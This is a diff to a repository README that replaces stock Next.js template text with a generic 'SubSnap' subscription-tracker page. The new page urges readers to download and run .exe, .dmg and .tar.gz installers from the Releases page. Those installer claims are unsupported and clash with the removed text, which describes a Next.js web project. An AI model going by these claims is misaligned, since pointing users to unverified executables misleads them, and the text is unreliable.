@@ -1,36 +1,68 @@
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
+# 📥 SubSnap - Manage Your Subscriptions Easily
 
-## Getting Started
+## 🚀 Getting Started
 
-First, run the development server:
+SubSnap helps you track and manage your recurring subscriptions. With this tool, you can stay on top of your bills and never miss a payment.
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
-```
+[![Download SubSnap](https://img.shields.io/badge/Download%20SubSnap-blue.svg)](https://github.com/luongytb/SubSnap/releases)
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+## 📦 Download & Install
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+To get started with SubSnap, visit the Releases page to download the latest version:
 
-This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
+[Download SubSnap](https://github.com/luongytb/SubSnap/releases)
 
-## Learn More
+### Installation Steps
 
-To learn more about Next.js, take a look at the following resources:
+1. **Visit the Releases Page**: Click the link above to access the SubSnap Releases page.
+  
+2. **Select the Latest Version**: Look for the latest version at the top of the page. This version will have the most features and fixes.
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+3. **Download the File**: Find the file that suits your operating system:
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
+   - For Windows, look for a file named `SubSnap.exe`.
+   - For Mac, choose `SubSnap.dmg`.
+   - For Linux, you might see `SubSnap.tar.gz`.
 
-## Deploy on Vercel
+4. **Run the Installer**:
+   - **Windows**: Double-click on the downloaded `.exe` file and follow the prompts.
+   - **Mac**: Open the downloaded `.dmg` file, then drag the SubSnap icon into your Applications folder.
+   - **Linux**: Extract the `.tar.gz` file, navigate to the folder, and run the program using your terminal.
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+### Accessing SubSnap
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+After installation, you can find SubSnap in your applications folder or start menu. Double-click the SubSnap icon to open the application.
+
+## 🛠️ System Requirements
+
+To run SubSnap smoothly, ensure your system meets these requirements:
+
+- **Windows**: Windows 10 or higher.
+- **Mac**: macOS Catalina or higher.
+- **Linux**: Ubuntu 20.04 or higher (other distributions may work, check compatibility).
+- **RAM**: At least 2GB of RAM.
+- **Storage**: Minimum of 100MB free disk space.
+
+## 📋 Features
+
+SubSnap offers several useful features:
+
+- **Subscription Tracking**: Easily add and manage all your subscriptions in one place.
+- **Payment Reminders**: Set reminders to receive notifications when bills are due.
+- **Reporting**: Generate reports to see your spending habits over time.
+- **User-Friendly Interface**: Navigate through the application without any technical know-how.
+
+## 📞 Support
+
+If you encounter issues or have questions about using SubSnap, feel free to reach out:
+
+- **Email**: support@subsnap.com
+- **Community Forum**: [SubSnap Community](https://github.com/luongytb/SubSnap/discussions)
+
+## 📢 Updates
+
+Stay tuned for regular updates to enhance your user experience. New features and improvements are added based on user feedback.
+
+---
+
+For any additional resources or documentation, please refer to the project's GitHub page. Enjoy managing your subscriptions with ease!
